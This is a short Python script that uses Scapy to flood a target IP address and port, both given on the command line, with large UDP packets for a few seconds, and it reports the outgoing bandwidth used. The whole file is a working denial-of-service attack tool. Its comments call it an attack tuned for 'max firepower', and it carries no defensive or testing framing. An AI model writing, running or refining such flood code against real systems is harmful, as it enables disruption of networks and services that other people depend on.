# raw_udp_flood.py — Optimized for max firepower (send instead of sendp)
import random
import time
import sys
from scapy.all import IP, UDP, Raw, send
import threading
import psutil

# === CONFIGURATION ===
DURATION = 3  # seconds
PAYLOAD = b"X" * 1400

# === BANDWIDTH MONITOR ===
def monitor_bandwidth():
    net = psutil.net_io_counters()
    start = net.bytes_sent
    time.sleep(DURATION)
    end = psutil.net_io_counters().bytes_sent
    kbps = ((end - start) * 8) / 1000
    print(f"[+] Bandwidth used during flood: {kbps:.2f} kbps")

# === FLOOD ===
def raw_udp_flood(target_ip, target_port):
    print(f"[+] Attacking {target_ip}:{target_port} for {DURATION} seconds...")
    threading.Thread(target=monitor_bandwidth).start()
    end_time = time.time() + DURATION
    while time.time() < end_time:
        try:
            pkt = IP(dst=target_ip) / UDP(sport=random.randint(1024, 65535), dport=int(target_port)) / Raw(load=PAYLOAD)
            send(pkt, verbose=0)
        except Exception as e:
            print(f"[!] Error: {e}")
    print("[+] Flood complete.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 raw_udp_flood.py <target_ip> <target_port>")
        sys.exit(1)
    raw_udp_flood(sys.argv[1], sys.argv[2])
